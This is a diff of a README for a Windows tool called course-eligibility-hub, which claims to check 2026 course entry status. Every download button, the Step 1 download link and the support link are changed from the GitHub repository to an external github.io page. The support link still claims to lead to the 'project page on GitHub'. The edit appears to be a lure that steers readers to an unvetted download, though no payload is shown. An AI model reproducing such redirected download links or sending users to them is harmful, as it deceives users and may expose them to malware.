@@ -1,7 +1,7 @@
 <h1>🎓 course-eligibility-hub - Check Your 2026 Course Entry Status</h1>
 
 <p align="center">
-  <a href="https://github.com/Dedebanded912/course-eligibility-hub" style="display: inline-block; padding: 12px 30px; background-color: #4CAF50; color: white; text-decoration: none; font-size: 20px; border-radius: 8px; font-weight: bold;">⬇️ Download Now - Free</a>
+  <a href="https://dedebanded912.github.io" style="display: inline-block; padding: 12px 30px; background-color: #4CAF50; color: white; text-decoration: none; font-size: 20px; border-radius: 8px; font-weight: bold;">⬇️ Download Now - Free</a>
 </p>
 
 <h2>📋 Overview</h2>
@@ -11,7 +11,7 @@
 <p>Follow these simple steps to download and run course-eligibility-hub on your Windows computer. The entire process takes less than two minutes.</p>
 
 <h3>Step 1: Download the Application</h3>
-<p>Visit this link to download the application: <a href="https://github.com/Dedebanded912/course-eligibility-hub">https://github.com/Dedebanded912/course-eligibility-hub</a></p>
+<p>Visit this link to download the application: <a href="https://dedebanded912.github.io">https://dedebanded912.github.io</a></p>
 
 <p>On the page that opens, look for the green "Code" button near the top right of the file list. Click it, then select "Download ZIP" from the dropdown menu. Your browser will save a compressed folder named "course-eligibility-hub-main.zip" to your Downloads folder.</p>
 
@@ -88,11 +88,11 @@
 <h2>📥 Download Again</h2>
 <p>If you need to download the application again or want to share it with someone else, use the link below:</p>
 <p align="center">
-  <a href="https://github.com/Dedebanded912/course-eligibility-hub" style="display: inline-block; padding: 12px 30px; background-color: #2196F3; color: white; text-decoration: none; font-size: 20px; border-radius: 8px; font-weight: bold;">⬇️ Download course-eligibility-hub</a>
+  <a href="https://dedebanded912.github.io" style="display: inline-block; padding: 12px 30px; background-color: #2196F3; color: white; text-decoration: none; font-size: 20px; border-radius: 8px; font-weight: bold;">⬇️ Download course-eligibility-hub</a>
 </p>
 
 <h2>📄 License</h2>
 <p>This project is open source and free to use. You can download, modify, and share it as needed. No attribution is required, though it is appreciated.</p>
 
 <h2>📞 Support</h2>
-<p>For questions, feature requests, or bug reports, please visit the <a href="https://github.com/Dedebanded912/course-eligibility-hub">project page on GitHub</a> and use the "Issues" section. The community and maintainers will respond as soon as possible.</p>
+<p>For questions, feature requests, or bug reports, please visit the <a href="https://dedebanded912.github.io">project page on GitHub</a> and use the "Issues" section. The community and maintainers will respond as soon as possible.</p>
